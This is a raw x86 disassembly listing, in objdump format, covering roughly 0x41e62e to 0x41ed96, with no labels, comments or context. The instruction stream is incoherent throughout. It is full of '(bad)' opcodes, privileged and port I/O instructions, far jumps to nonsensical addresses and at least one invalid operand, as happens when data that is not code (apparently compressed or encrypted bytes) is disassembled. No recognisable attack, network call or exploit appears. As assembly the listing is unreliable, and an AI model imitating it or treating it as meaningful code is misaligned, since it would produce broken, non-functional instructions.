  41e62e:	jo     0x41e68e
  41e630:	jmp    0x9185b838
  41e635:	xor    BYTE PTR [eax+0x422c71be],dl
  41e63b:	dec    esi
  41e63c:	arpl   WORD PTR [eax],di
  41e63e:	cld    
  41e63f:	fs pop esp
  41e641:	retf   0xf090
  41e644:	pop    ds
  41e645:	cli    
  41e646:	stos   BYTE PTR es:[edi],al
  41e647:	scas   al,BYTE PTR es:[edi]
  41e648:	mov    edi,ebp
  41e64a:	dec    ebp
  41e64b:	lahf   
  41e64c:	pop    ecx
  41e64d:	pmullw mm3,QWORD PTR [esi-0x33]
  41e651:	adc    al,0x40
  41e653:	mov    ah,0xde
  41e655:	or     al,0xf9
  41e657:	repnz inc eax
  41e659:	fsubr  QWORD PTR [esi-0x5694c442]
  41e65f:	(bad)  
  41e660:	push   edx
  41e661:	mov    esp,eax
  41e663:	mov    bl,0x25
  41e665:	push   edx
  41e666:	in     eax,0x70
  41e668:	loope  0x41e62f
  41e66a:	js     0x41e609
  41e66c:	or     edx,DWORD PTR [ebx-0x4f]
  41e66f:	faddp  st(2),st
  41e671:	xchg   edx,eax
  41e672:	ret    
  41e673:	pop    edi
  41e674:	sti    
  41e675:	mov    ebp,0x86c68e84
  41e67a:	jp     0x41e60c
  41e67c:	call   0x5928:0x5bddb0c0
  41e683:	pushw  es
  41e685:	hlt    
  41e686:	or     DWORD PTR [edx+0x59],eax
  41e689:	mov    ebp,0xf8726093
  41e68e:	mov    DWORD PTR [ebp-0x44],edi
  41e691:	push   eax
  41e692:	in     eax,dx
  41e693:	dec    ecx
  41e694:	fiadd  DWORD PTR [esi]
  41e696:	rol    DWORD PTR [edi-0x57],cl
  41e699:	jb     0x41e6bc
  41e69b:	sbb    ecx,edi
  41e69d:	push   0x1d519692
  41e6a2:	mov    ecx,0x6d8a5794
  41e6a7:	mov    al,ds:0xb19632d
  41e6ac:	push   ss
  41e6ad:	pushf  
  41e6ae:	inc    esi
  41e6af:	sahf   
  41e6b0:	mov    ds:0xbd5236d4,al
  41e6b5:	or     ch,BYTE PTR [edi+ecx*2+0x6b]
  41e6b9:	fcomip st,st(1)
  41e6bb:	dec    edi
  41e6bc:	cld    
  41e6bd:	sub    BYTE PTR [edx],al
  41e6bf:	call   0xa3482566
  41e6c4:	or     eax,0x1607a1f8
  41e6c9:	dec    cl
  41e6cb:	cmp    eax,0x12299a32
  41e6d0:	add    eax,0x4153cb0c
  41e6d5:	mov    eax,0x2621336f
  41e6da:	mov    edx,0x75c0ced3
  41e6df:	add    BYTE PTR [eax],bl
  41e6e1:	and    ch,BYTE PTR [edi-0x17]
  41e6e4:	pop    es
  41e6e5:	and    DWORD PTR [edx],esi
  41e6e7:	fdiv   st(6),st
  41e6e9:	push   cs
  41e6ea:	pop    ebx
  41e6eb:	xor    dh,bl
  41e6ed:	dec    ebx
  41e6ee:	and    al,BYTE PTR [ebx+0x2c]
  41e6f1:	imul   esp,DWORD PTR [ebp+0x5953f849],0xffffffb4
  41e6f8:	and    ebp,esi
  41e6fa:	add    ch,BYTE PTR ds:0x5525cfd5
  41e700:	jne    0x41e705
  41e702:	ret    0x1f1b
  41e705:	aad    0xc8
  41e707:	adc    BYTE PTR [ebp-0x35f06506],0x17
  41e70e:	push   ss
  41e70f:	sbb    BYTE PTR [ecx+0x65a5e201],bh
  41e715:	xor    cl,cl
  41e717:	sbb    DWORD PTR [eax-0x50],ecx
  41e71a:	mul    BYTE PTR [edx-0x43]
  41e71d:	cmp    BYTE PTR [ecx+0x75b934f4],dl
  41e723:	int3   
  41e724:	fisubr WORD PTR [eax]
  41e726:	cmc    
  41e727:	mov    bl,0x0
  41e729:	push   ebx
  41e72a:	and    eax,0x94bb34f0
  41e72f:	ret    
  41e730:	xchg   eax,eax
  41e732:	inc    ebp
  41e733:	cli    
  41e734:	sbb    ebp,DWORD PTR [ecx]
  41e736:	pop    esi
  41e737:	jae    0x41e6be
  41e739:	jmp    0x1f47ce4f
  41e73e:	fisttp QWORD PTR [eax-0x5ec85166]
  41e744:	jg     0x41e7ae
  41e746:	test   al,0xfb
  41e748:	cmp    BYTE PTR [esi+ebp*4+0x20d478b],ch
  41e74f:	aaa    
  41e750:	fiadd  DWORD PTR [eax+0x6266fe9e]
  41e756:	loop   0x41e7b9
  41e758:	adc    DWORD PTR [edx-0x26],ecx
  41e75b:	(bad)
  41e761:	xor    al,0xef
  41e763:	imul   ebx,DWORD PTR [esi-0xf],0x25
  41e767:	ja     0x41e735
  41e769:	dec    esi
  41e76a:	nop
  41e76b:	cmp    al,0x4c
  41e76d:	es adc al,0x30
  41e770:	popf   
  41e771:	sbb    eax,0x460592c1
  41e776:	pop    ecx
  41e777:	ret    0xe10c
  41e77a:	push   0x4c12b2d2
  41e77f:	ins    DWORD PTR es:[edi],dx
  41e780:	push   ss
  41e781:	(bad)  
  41e782:	cmp    esp,DWORD PTR [eax+0x77a39afc]
  41e788:	retf   
  41e789:	into   
  41e78a:	push   ds
  41e78b:	pop    es
  41e78c:	dec    ebp
  41e78d:	shl    DWORD PTR ss:[edi],cl
  41e790:	pushf  
  41e791:	push   ebx
  41e792:	pop    ecx
  41e793:	and    ecx,DWORD PTR [esi]
  41e795:	or     ax,WORD PTR [eax]
  41e798:	cmc    
  41e799:	fcmovne st,st(5)
  41e79b:	push   cs
  41e79c:	scas   eax,DWORD PTR es:[edi]
  41e79d:	mov    eax,0x80e1d533
  41e7a2:	dec    esi
  41e7a3:	loop   0x41e7d5
  41e7a5:	aad    0xf4
  41e7a7:	xchg   DWORD PTR [eax-0x60],ebx
  41e7aa:	push   ds
  41e7ab:	or     eax,0x12376468
  41e7b0:	add    ebp,DWORD PTR [ecx-0x7e]
  41e7b3:	adc    BYTE PTR [ecx-0x72],0x22
  41e7b7:	les    ecx,FWORD PTR [edi]
  41e7b9:	into   
  41e7ba:	dec    eax
  41e7bb:	pop    esi
  41e7bc:	adc    al,0x8f
  41e7be:	jnp    0x41e759
  41e7c0:	(bad)  
  41e7c1:	mov    ds:0x52ca8de4,al
  41e7c6:	fnstcw WORD PTR [ebp-0x27ac2c2]
  41e7cc:	jo     0x41e838
  41e7ce:	adc    cl,BYTE PTR [edi]
  41e7d0:	dec    ecx
  41e7d1:	addr16 mov ds:0x3690,al
  41e7d5:	or     eax,0x8f9f4ca
  41e7da:	mov    ebp,0x4c68ea66
  41e7df:	out    dx,eax
  41e7e0:	pop    ds
  41e7e1:	inc    eax
  41e7e2:	div    DWORD PTR [esi+0x2f2878f3]
  41e7e8:	(bad)  
  41e7e9:	jmp    0x41e7dc
  41e7eb:	les    ebx,FWORD PTR [ebx]
  41e7ed:	and    DWORD PTR [edi-0x4d],ebp
  41e7f0:	mov    esi,0x972b0132
  41e7f5:	push   ss
  41e7f6:	jb     0x41e869
  41e7f8:	xor    ebp,DWORD PTR [ebx+0x4d]
  41e7fb:	mov    edi,0xba46f295
  41e800:	add    BYTE PTR [edi-0x736c60ee],dh
  41e806:	mov    edx,0xd01599d4
  41e80b:	lods   eax,DWORD PTR ds:[esi]
  41e80c:	and    eax,0xf53360ca
  41e811:	push   ds
  41e812:	push   ds
  41e813:	loope  0x41e7d6
  41e815:	or     DWORD PTR [ecx-0x5e5b5bb6],edi
  41e81b:	push   edx
  41e81c:	cdq    
  41e81d:	ret    
  41e81e:	aam    0x9b
  41e820:	adc    DWORD PTR [ebp-0x337f9f90],edx
  41e826:	pop    ebx
  41e827:	mov    edx,0x1b0fde6e
  41e82c:	lds    esp,FWORD PTR [ebx-0x1d]
  41e82f:	mov    al,ds:0x31d271b3
  41e834:	fld    DWORD PTR [ecx+0x31eaa2a1]
  41e83a:	lahf   
  41e83b:	neg    BYTE PTR [ebx]
  41e83d:	popa   
  41e83e:	lea    edi,[ebx+esi*4+0x3]
  41e842:	fsub   DWORD PTR [ebx-0x62]
  41e845:	add    dh,BYTE PTR [ebp-0x1b]
  41e848:	pop    ds
  41e849:	pusha  
  41e84a:	fwait
  41e84b:	popf   
  41e84c:	iret   
  41e84d:	sahf   
  41e84e:	(bad)  
  41e84f:	mov    ebx,0x451c7ef9
  41e854:	out    dx,al
  41e855:	test   al,0x41
  41e857:	sub    DWORD PTR [ecx-0x768e3006],eax
  41e85d:	call   0x4571da28
  41e862:	cmp    BYTE PTR [ebx-0x582e04f9],dl
  41e868:	xchg   ebp,eax
  41e869:	pop    ecx
  41e86a:	ret    0xedd9
  41e86d:	add    eax,0x91be72ee
  41e872:	out    0x35,al
  41e874:	repz lds eax,FWORD PTR [eax+0x45]
  41e878:	xor    cl,BYTE PTR [ebx-0x6fc806b9]
  41e87e:	(bad)  
  41e87f:	es ror edx,cl
  41e882:	pop    esp
  41e883:	push   ecx
  41e884:	mov    esi,0xa8730c2d
  41e889:	fisttp QWORD PTR [ebp-0x4d]
  41e88c:	daa    
  41e88d:	cmp    eax,0x8f9e4e4b
  41e892:	mov    edi,0xa37c0fb9
  41e897:	dec    esp
  41e898:	jns    0x41e85b
  41e89a:	out    dx,al
  41e89b:	push   ebx
  41e89c:	rcl    DWORD PTR [edi+ebx*4-0x6107e99d],cl
  41e8a3:	clc    
  41e8a4:	inc    esi
  41e8a5:	mov    eax,0xa63a6fde
  41e8aa:	pop    esp
  41e8ab:	push   ebx
  41e8ac:	xchg   ebx,eax
  41e8ad:	inc    ecx
  41e8ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8af:	enter  0xc93f,0xa
  41e8b3:	dec    ebp
  41e8b4:	sbb    DWORD PTR [ecx+0x67],esp
  41e8b7:	dec    esi
  41e8b8:	add    al,0x7e
  41e8ba:	mov    bh,0x65
  41e8bc:	(bad)  
  41e8bd:	fimul  DWORD PTR [edx+ebp*8-0x2c14f5a]
  41e8c4:	mov    dl,0x71
  41e8c6:	mov    bh,0xf8
  41e8c8:	fcmove st,st(5)
  41e8ca:	jb     0x41e8e0
  41e8cc:	mov    ebp,0x1510c68d
  41e8d1:	int    0x6f
  41e8d3:	jne    0x41e947
  41e8d5:	pop    ecx
  41e8d7:	inc    esi
  41e8d8:	(bad)  
  41e8d9:	repz mov ebx,0x949ee76b
  41e8df:	les    esp,FWORD PTR [edx+0x31]
  41e8e2:	pusha  
  41e8e3:	aam    0xba
  41e8e5:	addr16 push ebp
  41e8e7:	sbb    al,dh
  41e8e9:	push   ebp
  41e8ea:	inc    edi
  41e8eb:	mov    ebx,0x4debcda7
  41e8f0:	mov    al,0x8f
  41e8f2:	or     BYTE PTR [ebp+0x36],dh
  41e8f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8f6:	add    edx,DWORD PTR [esi-0x6d3e4aab]
  41e8fc:	(bad)  
  41e8fd:	lahf   
  41e8fe:	mov    ?,WORD PTR [edi-0x2c]
  41e901:	popa   
  41e902:	leave  
  41e903:	jne    0x41e921
  41e905:	icebp  
  41e906:	mov    ch,0x3c
  41e908:	jge    0x41e8b8
  41e90a:	sub    ebp,DWORD PTR [ecx]
  41e90c:	xor    al,0x5a
  41e90e:	fdivr  st,st(1)
  41e910:	dec    edx
  41e911:	mov    ch,0x9f
  41e913:	push   eax
  41e914:	scas   eax,DWORD PTR es:[edi]
  41e915:	add    BYTE PTR [edi],cl
  41e917:	(bad)  
  41e918:	addr16 je 0x41e8c6
  41e91b:	enter  0x717b,0x87
  41e91f:	xor    eax,0x3fd96432
  41e924:	sub    DWORD PTR [esi-0x6c],edi
  41e927:	sbb    dl,BYTE PTR [ebx-0x612ebb18]
  41e92d:	daa    
  41e92e:	test   eax,0xa4367ec5
  41e933:	cmp    BYTE PTR [edi-0xa],dl
  41e936:	mov    ds:0x64a4e269,al
  41e93b:	imul   ebx,DWORD PTR [ecx+0x14],0xa0581eb
  41e942:	inc    ecx
  41e943:	mov    al,ds:0x3cca1900
  41e948:	repz mov es,ecx
  41e94b:	xlat   BYTE PTR ds:[ebx]
  41e94c:	ins    DWORD PTR es:[edi],dx
  41e94d:	daa    
  41e94e:	outs   dx,BYTE PTR ds:[esi]
  41e94f:	(bad)  
  41e950:	int    0xc9
  41e952:	add    eax,0xb7adf9a3
  41e957:	add    ch,BYTE PTR [ecx+0x77]
  41e95a:	add    DWORD PTR [ebp-0x3f],ebx
  41e95d:	adc    BYTE PTR [ecx-0x4],dh
  41e960:	xchg   esi,eax
  41e961:	ins    DWORD PTR es:[edi],dx
  41e962:	mov    dh,0x2e
  41e964:	mov    eax,ds:0xcc40f804
  41e969:	mov    DWORD PTR [ebx],esp
  41e96b:	jmp    0x41e913
  41e96d:	xchg   ebx,eax
  41e96e:	dec    esi
  41e96f:	sub    edi,DWORD PTR [ebx+0x53]
  41e972:	mov    eax,ds:0xb4d9644f
  41e977:	aas    
  41e978:	repz mov ah,BYTE PTR [edx-0xc85c5b7]
  41e97f:	out    dx,al
  41e980:	fdiv   st,st(4)
  41e982:	loop   0x41e9f0
  41e984:	dec    edx
  41e985:	and    ecx,DWORD PTR [esi+0x1]
  41e988:	iret   
  41e989:	test   eax,0xd69bb2a4
  41e98e:	or     esi,edi
  41e990:	dec    esp
  41e991:	aaa    
  41e992:	inc    esi
  41e993:	and    BYTE PTR [ebx],dh
  41e995:	inc    ebx
  41e996:	push   ds
  41e997:	pop    esi
  41e998:	mov    edi,0x29562df0
  41e99d:	jmp    0xfdecb9e0
  41e9a2:	mov    bh,0x32
  41e9a4:	jmp    0xd41c790b
  41e9a9:	cmc    
  41e9aa:	adc    BYTE PTR [edx],0x1e
  41e9ad:	shr    BYTE PTR [eax-0x11],cl
  41e9b0:	aad    0x1c
  41e9b2:	les    ebp,FWORD PTR [edi+0x42]
  41e9b5:	repnz int 0xf8
  41e9b8:	mov    esp,0x443d8d80
  41e9bd:	cld    
  41e9be:	jo     0x41e9f7
  41e9c0:	adc    dl,BYTE PTR [edx+0x1c]
  41e9c3:	leave  
  41e9c4:	ins    DWORD PTR es:[edi],dx
  41e9c5:	neg    DWORD PTR ds:0xc6bbf43d
  41e9cb:	mov    bl,0xe3
  41e9cd:	jbe    0x41e98c
  41e9cf:	add    al,0xf0
  41e9d1:	inc    esp
  41e9d2:	jae    0x41ea4c
  41e9d4:	ins    DWORD PTR es:[edi],dx
  41e9d5:	aam    0xcc
  41e9d7:	jns    0x41ea13
  41e9d9:	pop    edi
  41e9da:	ja     0x41e99a
  41e9dc:	add    eax,edx
  41e9de:	pop    ss
  41e9df:	push   ebx
  41e9e0:	add    DWORD PTR [edx+0xdb73b9f],ebp
  41e9e6:	push   eax
  41e9e7:	jl     0x41ea04
  41e9e9:	test   al,0xc4
  41e9eb:	adc    ah,BYTE PTR [esi]
  41e9ed:	int3   
  41e9ee:	cdq    
  41e9ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9f0:	adc    BYTE PTR [edx-0x60],0x82
  41e9f4:	pop    ss
  41e9f5:	pop    ebp
  41e9f6:	fcom   DWORD PTR [esi-0x35e1a1bf]
  41e9fc:	ins    DWORD PTR es:[edi],dx
  41e9fd:	xor    esp,esi
  41e9ff:	ja     0x41e9ef
  41ea01:	push   0x8535f5c4
  41ea06:	leave  
  41ea07:	push   ss
  41ea08:	lock inc esp
  41ea0a:	fucompp 
  41ea0c:	mov    BYTE PTR [ecx],0x33
  41ea0f:	fwait
  41ea10:	adc    DWORD PTR [ecx-0x1aea9dae],esp
  41ea16:	fsubr  QWORD PTR [edi+0x0]
  41ea19:	lods   al,BYTE PTR ds:[esi]
  41ea1a:	sub    BYTE PTR [esi],bh
  41ea1c:	ret    
  41ea1d:	jle    0x41ea30
  41ea1f:	xchg   ebp,eax
  41ea20:	xchg   ebx,eax
  41ea21:	lock jb 0x41ea16
  41ea24:	in     al,0x5c
  41ea26:	push   edx
  41ea27:	nop
  41ea28:	in     eax,0x24
  41ea2a:	pop    es
  41ea2b:	push   cs
  41ea2c:	jmp    0x6b79:0x3c94a4a8
  41ea33:	into   
  41ea34:	sbb    BYTE PTR [eax+ebx*2-0x78],bl
  41ea38:	lahf   
  41ea39:	ins    BYTE PTR es:[edi],dx
  41ea3a:	xor    edx,esi
  41ea3c:	cmc    
  41ea3d:	shl    BYTE PTR [ecx+eax*4-0x2560b12e],1
  41ea44:	cmc    
  41ea45:	shl    DWORD PTR [ecx-0x6e],0x2d
  41ea49:	sbb    DWORD PTR [ebx-0x5],ebp
  41ea4c:	jge    0x41ea46
  41ea4e:	sbb    esi,DWORD PTR [edi+0x3c]
  41ea51:	add    DWORD PTR [edx+0x1b],edx
  41ea54:	imul   ebx,ecx,0xffffff8e
  41ea57:	jecxz  0x41ea03
  41ea59:	mov    edi,ebx
  41ea5b:	(bad)  
  41ea5d:	xor    BYTE PTR [ecx+0xd7298c9],dh
  41ea63:	adc    ebp,ebp
  41ea65:	or     cl,0x2d
  41ea68:	je     0x41ea17
  41ea6a:	adc    DWORD PTR [edi+0x34],ebx
  41ea6d:	loopne 0x41ea92
  41ea6f:	mul    DWORD PTR [eax-0x7eed165c]
  41ea75:	xchg   ebp,eax
  41ea76:	paddd  mm2,QWORD PTR [esi-0x15]
  41ea7a:	or     edi,DWORD PTR [ebx+esi*2-0x5eea26a7]
  41ea81:	rcr    DWORD PTR [eax],cl
  41ea83:	or     BYTE PTR [edi],bl
  41ea85:	mov    ebx,0xfeba5f22
  41ea8a:	popf   
  41ea8b:	xchg   edi,eax
  41ea8c:	in     eax,dx
  41ea8d:	lock aaa 
  41ea8f:	cmp    bh,BYTE PTR [edi-0x12]
  41ea92:	cmp    BYTE PTR [ecx],dh
  41ea94:	sar    BYTE PTR [edx+0x4e2c529d],cl
  41ea9a:	je     0x41ea8e
  41ea9c:	mov    ebx,DWORD PTR [ecx]
  41ea9e:	push   edi
  41ea9f:	arpl   sp,bp
  41eaa1:	mov    ah,0x4f
  41eaa3:	scas   eax,DWORD PTR es:[edi]
  41eaa4:	dec    DWORD PTR [eax+0x57ffad76]
  41eaaa:	ror    BYTE PTR [eax+0x28],cl
  41eaad:	adc    ecx,DWORD PTR [ebx-0x5e]
  41eab0:	xchg   edx,eax
  41eab1:	cmp    al,0xf0
  41eab3:	jbe    0x41eb10
  41eab5:	mov    edi,0xe3245250
  41eaba:	push   ebp
  41eabb:	jle    0x41ea43
  41eabd:	jge    0x41ea5c
  41eabf:	adc    DWORD PTR [esp+ebx*2-0x7c],edi
  41eac3:	fsub   st(2),st
  41eac5:	mov    esi,0x7f3a0569
  41eaca:	aam    0xb7
  41eacc:	mov    edx,0x2fa9071f
  41ead1:	aas    
  41ead2:	out    0xc8,al
  41ead4:	rep ins DWORD PTR es:[edi],dx
  41ead6:	and    ecx,ebp
  41ead8:	fidiv  WORD PTR [ecx+0x50]
  41eadb:	add    BYTE PTR ds:0xc8ae0cef,0xab
  41eae2:	and    cl,dh
  41eae4:	or     BYTE PTR [eax-0x68c62d],bl
  41eaea:	and    BYTE PTR [ebx-0x2e46368a],cl
  41eaf0:	or     DWORD PTR [esi],0x7b
  41eaf3:	push   0xffffff81
  41eaf5:	fldcw  WORD PTR [edx+0x47]
  41eaf8:	and    eax,0x19738f2
  41eafd:	sti    
  41eafe:	sub    dl,ah
  41eb00:	and    dl,cl
  41eb02:	cmp    BYTE PTR [esi+eiz*8-0x17200acc],bh
  41eb09:	or     BYTE PTR [edi],cl
  41eb0b:	or     eax,0x980eaf93
  41eb10:	pop    eax
  41eb11:	cmp    al,0x45
  41eb13:	xchg   esp,eax
  41eb14:	xchg   eax,ebp
  41eb16:	lods   eax,DWORD PTR ds:[esi]
  41eb17:	icebp  
  41eb18:	and    eax,0xd40f7a46
  41eb1d:	cmc    
  41eb1e:	mov    ebp,0x10dee724
  41eb23:	leave  
  41eb24:	jge    0x41eac8
  41eb26:	sbb    bl,BYTE PTR [ebx+edx*2]
  41eb29:	xchg   ebx,eax
  41eb2a:	and    BYTE PTR [esp+edx*4+0x253ffc99],dl
  41eb31:	mov    esi,eax
  41eb33:	fmulp  st(4),st
  41eb35:	int    0x3c
  41eb37:	jne    0x41eb1e
  41eb39:	mov    bh,0xe8
  41eb3b:	(bad)  [ebx-0x1d0c5350]
  41eb41:	fcomp  DWORD PTR [ebx+ebp*1+0x2e98ed79]
  41eb48:	add    bl,bh
  41eb4a:	pop    ds
  41eb4b:	repz xchg edi,eax
  41eb4d:	sbb    edi,ecx
  41eb4f:	xor    ebp,esp
  41eb51:	jmp    0x41eb94
  41eb53:	es pop ds
  41eb55:	(bad)  
  41eb56:	cmp    BYTE PTR [edi+0x605fd450],ch
  41eb5c:	sbb    al,0x6d
  41eb5e:	or     dh,BYTE PTR [ebp+0x46]
  41eb61:	(bad)  
  41eb62:	sbb    ebx,ebx
  41eb64:	or     cl,BYTE PTR [ebp-0x4b]
  41eb67:	fild   DWORD PTR [esi-0x1b]
  41eb6a:	xchg   BYTE PTR [esi+0x69],bl
  41eb6d:	and    BYTE PTR ds:0xe457103,al
  41eb73:	mov    dh,0x37
  41eb75:	cmp    bh,bl
  41eb77:	sub    edx,DWORD PTR ds:[ecx+0x26]
  41eb7b:	xchg   DWORD PTR [ebx],esi
  41eb7d:	xchg   edx,eax
  41eb7e:	mov    ebx,0x5f6aba39
  41eb83:	hlt    
  41eb84:	cdq    
  41eb85:	repz lock and esi,DWORD PTR [ebx+ecx*2-0x25]
  41eb8b:	push   ds
  41eb8c:	mov    ecx,0x734929c
  41eb91:	js     0x41eb89
  41eb93:	sub    dh,bl
  41eb95:	ins    DWORD PTR es:[edi],dx
  41eb96:	xchg   ebp,eax
  41eb97:	lds    edx,FWORD PTR [eax+0x2f405efe]
  41eb9d:	jl     0x41eba1
  41eb9f:	xchg   edi,eax
  41eba0:	loop   0x41eb60
  41eba2:	dec    esp
  41eba3:	jo     0x41ec05
  41eba5:	(bad)  
  41eba7:	pop    eax
  41eba8:	outs   dx,DWORD PTR ds:[esi]
  41eba9:	nop
  41ebaa:	data16 out dx,al
  41ebac:	adc    ebp,ecx
  41ebae:	pop    ds
  41ebaf:	cmp    al,0xc1
  41ebb1:	xchg   edx,eax
  41ebb2:	cmp    al,0x98
  41ebb4:	add    al,0x71
  41ebb6:	scas   eax,DWORD PTR es:[edi]
  41ebb7:	repz mov dh,BYTE PTR [ebp+0x2d]
  41ebbb:	cdq    
  41ebbc:	cli    
  41ebbd:	popa   
  41ebbe:	aad    0x20
  41ebc0:	lods   eax,DWORD PTR ds:[esi]
  41ebc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc2:	jge    0x41eb45
  41ebc4:	sar    BYTE PTR [esi],0x83
  41ebc7:	xor    DWORD PTR [ecx-0x1dcf0976],edi
  41ebcd:	aaa    
  41ebce:	cwde   
  41ebcf:	int    0x4e
  41ebd1:	les    esp,FWORD PTR [ebx-0x7ed97b8e]
  41ebd7:	out    dx,eax
  41ebd8:	sub    DWORD PTR [ebp+0x6b46bb8d],0xffffff9f
  41ebdf:	in     al,dx
  41ebe0:	inc    ebx
  41ebe1:	sbb    al,0xa8
  41ebe3:	(bad)  
  41ebe4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebe5:	mov    WORD PTR [edi+0x718b1eb7],cs
  41ebeb:	arpl   cx,di
  41ebed:	mov    ebp,0xd48bc3e8
  41ebf2:	dec    esi
  41ebf3:	div    DWORD PTR [ecx]
  41ebf5:	cmp    ebp,DWORD PTR [bx]
  41ebf8:	and    DWORD PTR [eax],ebp
  41ebfa:	rol    bh,1
  41ebfc:	imul   edx,DWORD PTR [ebp+edx*1-0x47119f2d],0x89b1185f
  41ec07:	pop    ebp
  41ec08:	pop    esi
  41ec09:	bound  ecx,QWORD PTR [eax-0x51]
  41ec0c:	push   ebp
  41ec0d:	sbb    ecx,esi
  41ec0f:	retf   0xd0b
  41ec12:	inc    esi
  41ec13:	div    DWORD PTR [eax]
  41ec15:	jmp    0x2796:0xb89936e1
  41ec1c:	add    DWORD PTR [ecx+0x21b40bc4],eax
  41ec22:	or     al,0xa4
  41ec24:	jle    0x41ebad
  41ec26:	lea    eax,[ecx]
  41ec28:	push   cs
  41ec29:	adc    al,0xae
  41ec2b:	in     eax,0xd0
  41ec2d:	imul   ebx,DWORD PTR [edi],0x6d4eff30
  41ec33:	in     al,dx
  41ec34:	repnz rcl ah,0x1
  41ec38:	pop    ebx
  41ec39:	lock aaa 
  41ec3b:	addr16 in al,dx
  41ec3d:	cmp    ch,bl
  41ec3f:	adc    eax,0x4a7a1d10
  41ec44:	scas   al,BYTE PTR es:[edi]
  41ec45:	bound  ebx,QWORD PTR [ecx+0x29]
  41ec48:	mov    ebp,0xdf7abba6
  41ec4d:	mov    ah,0x22
  41ec4f:	jp     0x41ec9d
  41ec51:	or     eax,eax
  41ec53:	sub    eax,0x1d025a09
  41ec58:	jle    0x41ecd0
  41ec5a:	int    0xc
  41ec5c:	dec    eax
  41ec5d:	sub    esi,DWORD PTR ds:0xe0f94df9
  41ec63:	or     esi,DWORD PTR [edi]
  41ec65:	xchg   esp,eax
  41ec66:	xor    DWORD PTR [ecx+0x30],esi
  41ec69:	cli    
  41ec6a:	mov    ecx,0xe50607fe
  41ec6f:	xlat   BYTE PTR ds:[ebx]
  41ec70:	daa    
  41ec71:	jl     0x41ec93
  41ec73:	adc    al,0xd6
  41ec75:	mov    ds:0x1ed96ca3,al
  41ec7a:	cdq    
  41ec7b:	daa    
  41ec7c:	pop    es
  41ec7d:	in     eax,0x18
  41ec7f:	aam    0x1c
  41ec81:	dec    ebx
  41ec82:	pop    esp
  41ec83:	pop    esp
  41ec84:	and    DWORD PTR [edx+ebx*1+0x2f],ebp
  41ec88:	jmp    0x3748:0x6250be30
  41ec8f:	dec    edi
  41ec90:	sbb    eax,0x98ca65fa
  41ec95:	in     eax,dx
  41ec96:	add    ecx,DWORD PTR [ebx+0x79ce35cb]
  41ec9c:	sbb    BYTE PTR [ecx+0x77495a69],bh
  41eca2:	mov    dl,BYTE PTR [esi]
  41eca4:	popf   
  41eca5:	adc    BYTE PTR [ebx+0x73ca7448],dl
  41ecab:	jo     0x41ec32
  41ecad:	jns    0x41ec4a
  41ecaf:	and    ch,dh
  41ecb1:	in     eax,dx
  41ecb2:	jl     0x41ed1e
  41ecb4:	mov    cl,0x2c
  41ecb6:	sbb    ebx,ebx
  41ecb8:	xlat   BYTE PTR ds:[ebx]
  41ecb9:	outs   dx,DWORD PTR ds:[esi]
  41ecba:	mov    cl,0xc9
  41ecbc:	push   ds
  41ecbd:	adc    BYTE PTR [esp+esi*8],al
  41ecc0:	push   edi
  41ecc1:	sbb    eax,0x6b61fd69
  41ecc6:	pop    eax
  41ecc7:	pop    eax
  41ecc8:	add    BYTE PTR [edx-0x7c],al
  41eccb:	adc    esp,DWORD PTR [ecx+0x2a]
  41ecce:	or     BYTE PTR [esi-0x29002ef9],bh
  41ecd4:	(bad)  
  41ecd5:	mov    edi,0x11485b8b
  41ecda:	mov    ecx,DWORD PTR [eax]
  41ecdc:	popf   
  41ecdd:	push   0xffffffef
  41ecdf:	fimul  DWORD PTR [edx+eiz*2]
  41ece2:	mov    edx,0x3cf119f5
  41ece7:	sub    cl,BYTE PTR [edi]
  41ece9:	scas   al,BYTE PTR es:[edi]
  41ecea:	nop
  41eceb:	cmp    al,0x20
  41eced:	test   eax,0xb9ecc68a
  41ecf2:	rcl    BYTE PTR [eax-0x1f],1
  41ecf5:	xor    esp,edi
  41ecf7:	ss mov edi,0xcf0e95ae
  41ecfd:	call   0xbc327d1e
  41ed02:	xchg   DWORD PTR [esi+0x36],ebp
  41ed05:	daa    
  41ed06:	xchg   esi,eax
  41ed07:	mov    ds:0x32b3d6ab,al
  41ed0c:	loope  0x41ecb3
  41ed0e:	mov    al,0xb7
  41ed10:	mov    bh,0x76
  41ed12:	mov    WORD PTR [edx+0x7b],es
  41ed15:	lea    esi,[ecx]
  41ed17:	sub    DWORD PTR [ecx+0x8],0x2
  41ed1b:	jns    0x41ed31
  41ed1d:	test   al,0xbe
  41ed1f:	jb     0x41ecf9
  41ed21:	clc    
  41ed22:	call   0x4abf6597
  41ed27:	sub    eax,0x4f2c45a0
  41ed2c:	adc    dl,dl
  41ed2e:	ret    
  41ed2f:	retf   
  41ed30:	pusha  
  41ed31:	mov    edi,0x4572264
  41ed36:	push   edx
  41ed37:	rol    DWORD PTR [ecx-0x5f],1
  41ed3a:	push   ecx
  41ed3b:	xchg   ecx,eax
  41ed3c:	icebp  
  41ed3d:	outs   dx,BYTE PTR ds:[esi]
  41ed3e:	retf   
  41ed3f:	push   ss
  41ed40:	adc    dl,BYTE PTR [edx-0x653a22f]
  41ed46:	cdq    
  41ed47:	retf   
  41ed48:	inc    ebx
  41ed49:	data16 xor BYTE PTR [edi+eiz*8+0x1c60dc1a],dl
  41ed51:	loopne 0x41ed72
  41ed53:	xchg   edi,eax
  41ed54:	adc    ah,dl
  41ed56:	ror    edx,0x8e
  41ed59:	jb     0x41ecff
  41ed5b:	jnp    0x41ecf8
  41ed5d:	add    eax,0x545c4012
  41ed62:	(bad)  
  41ed63:	jmp    0x41eda1
  41ed65:	or     eax,0x99cefaba
  41ed6a:	shr    DWORD PTR [esi],1
  41ed6c:	retf   
  41ed6d:	inc    ebp
  41ed6e:	retf   0x203f
  41ed71:	mov    eax,ds:0x7e4ce592
  41ed76:	jle    0x41edcd
  41ed78:	ds repz pop ebx
  41ed7b:	push   ecx
  41ed7c:	jecxz  0x41eda0
  41ed7e:	or     ebx,DWORD PTR [eax]
  41ed80:	lds    eax,FWORD PTR [esi-0x4f]
  41ed83:	(bad)  
  41ed84:	loopne 0x41ed45
  41ed86:	or     dh,0x47
  41ed89:	into   
  41ed8a:	jp     0x41edb4
  41ed8c:	mov    ds:0x35c95120,eax
  41ed91:	add    eax,0x52f4d36f
  41ed96:	jg     0x41ee01
